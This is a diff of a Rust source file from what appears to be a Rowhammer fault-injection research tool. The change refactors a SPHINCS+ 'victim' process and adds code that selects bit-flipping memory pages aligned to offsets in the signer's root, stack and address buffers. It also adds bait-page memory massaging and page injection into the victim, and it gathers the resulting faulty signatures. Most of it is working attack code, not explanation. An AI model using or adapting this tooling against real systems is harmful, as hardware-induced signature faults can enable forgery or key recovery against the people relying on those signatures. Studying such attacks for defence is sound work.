@@ -1,4 +1,5 @@
 use std::{
+    collections::HashMap,
     fs::File,
     io::{BufRead, BufReader},
     process::{ChildStdin, ChildStdout},
@@ -6,20 +7,53 @@ use std::{
     time::Duration,
 };
 
+use anyhow::bail;
+use itertools::Itertools;
 use libc::sched_getcpu;
 use serde::Serialize;
 
 use crate::{
-    util::{PipeIPC, IPC},
-    victim::process::piped_channel,
+    memory::{find_flippy_page, PfnResolver},
+    util::{PipeIPC, IPC, PAGE_SIZE},
+    victim::piped_channel,
 };
 
-use super::{HammerVictim, HammerVictimError, PageInjector, VictimResult};
+use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, VictimResult};
 
+#[derive(Serialize)]
+enum State {
+    Init {
+        binary: String,
+        injection_config: InjectionConfig,
+    },
+    Running {
+        target: String,
+        #[serde(skip_serializing)]
+        child: std::process::Child,
+        #[serde(skip_serializing)]
+        pipe: PipeIPC<ChildStdout, ChildStdin>,
+        #[serde(skip_serializing)]
+        stderr_logger: Option<thread::JoinHandle<()>>,
+        target_pfn: u64,
+        region_offset: usize,
+    },
+    Stopped,
+}
+
+#[derive(Serialize)]
 pub struct SphincsPlus {
-    child: std::process::Child,
-    pipe: PipeIPC<ChildStdout, ChildStdin>,
-    stderr_logger: Option<thread::JoinHandle<()>>,
+    state: State,
+}
+
+impl SphincsPlus {
+    pub fn target_addr(&self) -> *const libc::c_void {
+        match &self.state {
+            State::Init {
+                injection_config, ..
+            } => injection_config.target_addr as *const libc::c_void,
+            _ => panic!("Invalid state"),
+        }
+    }
 }
 
 fn set_process_affinity(pid: libc::pid_t, core_id: usize) {
@@ -63,6 +97,86 @@ pub struct StackProcessHammerResult {
 const KEYS_FILE: &str = "keys.txt";
 const SIGS_FILE: &str = "sigs.txt";
 
+// find profile entry with bitflips in needed range
+#[derive(Clone, Debug, Serialize)]
+pub struct TargetOffset {
+    description: String,
+    page_offset: usize,
+    stack_offset: usize,
+    target_size: usize,
+}
+fn filter_addrs(addrs: Vec<usize>, targets: &[TargetOffset]) -> Vec<(usize, TargetOffset)> {
+    addrs
+        .into_iter()
+        .filter_map(|addr| {
+            let pg_offset = addr & 0xfff;
+            let matched = targets.iter().find(|&target| {
+                let addr = target.page_offset & 0xfff;
+                addr <= pg_offset && pg_offset < addr + target.target_size
+            });
+            if matched.is_some() {
+                info!("Matched addr {:?} to target {:?}", addr, matched);
+            }
+            matched.map(|offset| (addr, offset.clone()))
+        })
+        .collect_vec()
+}
+
+fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
+    let targets = [
+        // attack root[SPX_N] for 256s
+        TargetOffset {
+            description: "root[SPX_N] 256s".to_string(),
+            page_offset: 0xec0,
+            stack_offset: 31,
+            target_size: 32,
+        },
+        // attack stack for 256s
+        TargetOffset {
+            description: "stack 256s".to_string(),
+            page_offset: 0x700,
+            stack_offset: 31,
+            target_size: 448,
+        },
+        // attack stack for 256s
+        TargetOffset {
+            description: "stack 256s".to_string(),
+            page_offset: 0xa10,
+            stack_offset: 31,
+            target_size: 256,
+        },
+        // attack leaf_addr (22 byte) for 256s
+        TargetOffset {
+            description: "leaf_addr 256s".to_string(),
+            page_offset: 0xc68,
+            stack_offset: 31,
+            target_size: 22,
+        },
+        // attack pk_addr (22 byte) for 256s
+        TargetOffset {
+            description: "pk_addr 256s".to_string(),
+            page_offset: 0xc48,
+            stack_offset: 31,
+            target_size: 22,
+        },
+    ];
+    // the number of bait pages to release after the target page (for memory massaging)
+    let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
+
+    filter_addrs(addrs, &targets)
+        .first()
+        .map(|f| InjectionConfig {
+            target_addr: f.0,
+            flippy_page_size: PAGE_SIZE,
+            bait_count_after: bait_count_after
+                .get(&f.1.stack_offset)
+                .copied()
+                .expect("unsupported stack offset"),
+            bait_count_before: 0,
+            stack_offset: f.1.stack_offset,
+        })
+}
+
 impl SphincsPlus {
     /// Create a new `SphincsPlus` victim.
     ///
@@ -71,100 +185,178 @@ impl SphincsPlus {
     /// - `keys_path`: The path to the keys.
     /// - `sigs_path`: The output path to the signatures.
     /// - `injection_config`: The injection configuration.
-    pub fn new(binary: String, page_injector: PageInjector) -> anyhow::Result<Self> {
-        set_process_affinity(unsafe { libc::getpid() }, get_current_core());
-        let mut cmd = std::process::Command::new("taskset");
-        cmd.arg("-c").arg(get_current_core().to_string());
-        cmd.arg(binary);
-        cmd.arg(KEYS_FILE);
-        cmd.arg(SIGS_FILE);
-        cmd.stdin(std::process::Stdio::piped());
-        cmd.stdout(std::process::Stdio::piped());
-        cmd.stderr(std::process::Stdio::piped());
-        let mut child = page_injector.inject(cmd)?;
-        info!("Victim launched");
-
-        // Log victim stderr
-        let stderr_logger = if let Some(stderr) = child.stderr.take() {
-            let reader = BufReader::new(stderr);
-
-            // Spawn a thread to handle logging from stderr
-            let handle = thread::spawn(move || {
-                for line in reader.lines() {
-                    match line {
-                        Ok(log_line) => {
-                            info!("{}", log_line);
-                        }
-                        Err(err) => error!("Error reading line from child process: {}", err),
-                    }
-                }
-            });
-            Some(handle)
-        } else {
-            eprintln!("Failed to capture stderr");
-            child.kill().expect("kill");
-            child.wait().expect("wait");
-            None
-        };
-
-        // todo: maybe check injection (prime+probe?)
-        std::thread::sleep(Duration::from_millis(100));
-
-        // Pin the child to the next core
-        let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
-        let target_core = (get_current_core() + 1) % num_cores as usize;
-        info!("Pinning child to core {}", target_core);
-        set_process_affinity(child.id() as libc::pid_t, target_core);
-
-        // Create a pipe for IPC
-        let pipe = piped_channel(&mut child)?;
+    pub fn new(binary: String, addrs: Vec<usize>) -> anyhow::Result<Self> {
+        let injection_config = find_injectable_page(addrs)
+            .ok_or_else(|| anyhow::anyhow!("No injectable page found"))?;
         Ok(Self {
-            child,
-            pipe,
-            stderr_logger,
+            state: State::Init {
+                binary,
+                injection_config,
+            },
         })
     }
 
-    pub fn pid(&self) -> u32 {
-        self.child.id()
+    pub fn pid(&self) -> Option<u32> {
+        match self.state {
+            State::Running { ref child, .. } => Some(child.id()),
+            _ => None,
+        }
     }
 }
 
 impl HammerVictim for SphincsPlus {
     fn start(&mut self) {
-        if std::path::Path::new("sigs.txt").exists() {
-            std::fs::remove_file("sigs.txt").expect("Failed to delete sigs.txt");
+        match &self.state {
+            State::Init {
+                binary,
+                injection_config,
+            } => {
+                if std::path::Path::new(SIGS_FILE).exists() {
+                    std::fs::remove_file(SIGS_FILE).expect("Failed to delete sigs.txt");
+                }
+                set_process_affinity(unsafe { libc::getpid() }, get_current_core());
+                let mut cmd = std::process::Command::new("taskset");
+                cmd.arg("-c").arg(get_current_core().to_string());
+                cmd.arg(binary);
+                cmd.arg(KEYS_FILE);
+                cmd.arg(SIGS_FILE);
+                cmd.stdin(std::process::Stdio::piped());
+                cmd.stdout(std::process::Stdio::piped());
+                cmd.stderr(std::process::Stdio::piped());
+                let page_injector = PageInjector::new(*injection_config);
+                let target_pfn = (injection_config.target_addr as *const libc::c_void)
+                    .pfn()
+                    .expect("PFN resolve failed");
+                let mut child = page_injector.inject(cmd).expect("Failed to inject page");
+                info!("Victim launched");
+
+                // Log victim stderr
+                let stderr_logger = if let Some(stderr) = child.stderr.take() {
+                    let reader = BufReader::new(stderr);
+
+                    // Spawn a thread to handle logging from stderr
+                    let handle = thread::spawn(move || {
+                        for line in reader.lines() {
+                            match line {
+                                Ok(log_line) => {
+                                    info!("{}", log_line);
+                                }
+                                Err(err) => {
+                                    error!("Error reading line from child process: {}", err)
+                                }
+                            }
+                        }
+                    });
+                    Some(handle)
+                } else {
+                    eprintln!("Failed to capture stderr");
+                    child.kill().expect("kill");
+                    child.wait().expect("wait");
+                    None
+                };
+
+                // todo: maybe check injection (prime+probe?)
+                std::thread::sleep(Duration::from_millis(100));
+
+                // Pin the child to the next core
+                //let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
+                //let target_core = (get_current_core() + 1) % num_cores as usize;
+                //info!("Pinning child to core {}", target_core);
+                //set_process_affinity(child.id() as libc::pid_t, target_core);
+
+                // Create a pipe for IPC
+                let pipe = piped_channel(&mut child).expect("Failed to pipe IPC");
+                // find flippy page
+                self.state = State::Running {
+                    target: binary.clone(),
+                    child,
+                    pipe,
+                    stderr_logger,
+                    target_pfn,
+                    region_offset: injection_config.stack_offset,
+                };
+                self.check_flippy_page_exists()
+                    .expect("check_flippy_page_exists");
+            }
+            _ => panic!("Invalid state"),
         }
     }
     fn init(&mut self) {}
 
     fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
-        self.pipe
-            .wait_for("press enter to start check".to_string())?;
-        self.pipe.send(b'\n')?;
-        let resp: String = self.pipe.receive().map_err(HammerVictimError::IoError)?;
-        if resp.starts_with("FLIPPED") {
-            let file = File::open("sigs.txt").map_err(HammerVictimError::IoError)?;
-            let reader = BufReader::new(file);
-            let signatures: Vec<String> = reader
-                .lines()
-                .collect::<Result<_, _>>()
-                .map_err(HammerVictimError::IoError)?;
-            Ok(VictimResult::Strings(signatures))
-        } else {
-            Err(HammerVictimError::NoFlips)
+        match &mut self.state {
+            State::Running { pipe, .. } => {
+                pipe.wait_for("press enter to start check".to_string())?;
+                pipe.send(b'\n')?;
+                let resp: String = pipe.receive().map_err(HammerVictimError::IoError)?;
+                if resp.starts_with("FLIPPED") {
+                    let file = File::open(SIGS_FILE).map_err(HammerVictimError::IoError)?;
+                    let reader = BufReader::new(file);
+                    let signatures: Vec<String> = reader
+                        .lines()
+                        .collect::<Result<_, _>>()
+                        .map_err(HammerVictimError::IoError)?;
+                    Ok(VictimResult::Strings(signatures))
+                } else {
+                    Err(HammerVictimError::NoFlips)
+                }
+            }
+            _ => Err(HammerVictimError::NotRunning),
         }
     }
 
-    fn stop(mut self) {
-        self.child.kill().expect("kill");
-        self.child.wait().expect("wait");
-        if let Some(stderr_logger) = self.stderr_logger {
-            stderr_logger.join().expect("join");
+    fn stop(&mut self) {
+        if let State::Running {
+            child,
+            stderr_logger,
+            ..
+        } = &mut self.state
+        {
+            child.kill().expect("kill");
+            child.wait().expect("wait");
+            if let Some(stderr_logger) = stderr_logger.take() {
+                stderr_logger.join().expect("join");
+            }
+            self.state = State::Stopped;
         }
     }
 }
 
+impl SphincsPlus {
+    fn check_flippy_page_exists(&self) -> anyhow::Result<()> {
+        if let State::Running {
+            child,
+            target_pfn,
+            region_offset,
+            ..
+        } = &self.state
+        {
+            let flippy_page = find_flippy_page(*target_pfn, child.id());
+            match flippy_page {
+                Ok(Some(flippy_page)) => {
+                    info!("Flippy page found: {:?}", flippy_page);
+                    if flippy_page.region_offset != *region_offset {
+                        warn!(
+                            "Flippy page offset mismatch: {} != {}",
+                            flippy_page.region_offset, region_offset
+                        );
+                        bail!(
+                            "Flippy page offset mismatch! Expected {}, got {}",
+                            region_offset,
+                            flippy_page.region_offset
+                        );
+                    }
+                    return Ok(());
+                }
+                Ok(None) => {
+                    bail!("Flippy page not found");
+                }
+                Err(e) => return Err(e),
+            }
+        }
+        bail!("Not running");
+    }
+}
 #[cfg(test)]
 mod tests {
     use std::ptr::null_mut;
@@ -172,21 +364,19 @@ mod tests {
     use crate::{
         allocator::util::mmap,
         util::PAGE_SIZE,
-        victim::{sphincs_plus, HammerVictim, InjectionConfig, PageInjector},
+        victim::{
+            sphincs_plus::{self, filter_addrs, TargetOffset},
+            HammerVictim,
+        },
     };
 
     #[test]
     fn test_sphincs_plus() -> anyhow::Result<()> {
-        let ptr = mmap(null_mut(), PAGE_SIZE);
-        let injection_config = InjectionConfig {
-            flippy_page: ptr,
-            flippy_page_size: PAGE_SIZE,
-            bait_count_after: 0,
-            bait_count_before: 0,
-        };
-        let injector = PageInjector::new(injection_config);
-        let mut stack_process =
-            super::SphincsPlus::new("/home/jb/sphincsplus/ref/test/server".to_string(), injector)?;
+        let ptr = mmap(null_mut(), PAGE_SIZE) as *const libc::c_void;
+        let mut stack_process = super::SphincsPlus::new(
+            "/home/jb/sphincsplus/ref/test/server".to_string(),
+            vec![ptr as usize],
+        )?;
         for _ in 0..10 {
             stack_process.init();
             let resp = stack_process.check();
@@ -197,5 +387,44 @@ mod tests {
             );
         }
         Ok(())
+    }
+
+    #[test]
+    fn test_filter_addrs_match_start() {
+        let addrs = vec![0x700];
+        let targets = [TargetOffset {
+            description: "test_filter_flips_match_start".to_string(),
+            page_offset: 0x700,
+            stack_offset: 31,
+            target_size: 32,
+        }];
+        let filtered = filter_addrs(addrs, &targets);
+        assert_eq!(filtered.len(), 1);
+    }
+
+    #[test]
+    fn test_filter_addrs_match_end() {
+        let addrs = vec![0x700];
+        let target = TargetOffset {
+            description: "test_filter_flips_match_end".to_string(),
+            page_offset: 0x600,
+            stack_offset: 31,
+            target_size: 0x101,
+        };
+        let filtered = filter_addrs(addrs, &[target]);
+        assert_eq!(filtered.len(), 1);
+    }
+
+    #[test]
+    fn test_filter_addrs_nomatch() {
+        let addrs = vec![0x700];
+        let target = TargetOffset {
+            description: "test_filter_flips_nomatch".to_string(),
+            page_offset: 0x600,
+            stack_offset: 31,
+            target_size: 0x100,
+        };
+        let filtered = filter_addrs(addrs, &[target]);
+        assert_eq!(filtered.len(), 0);
     }
 }
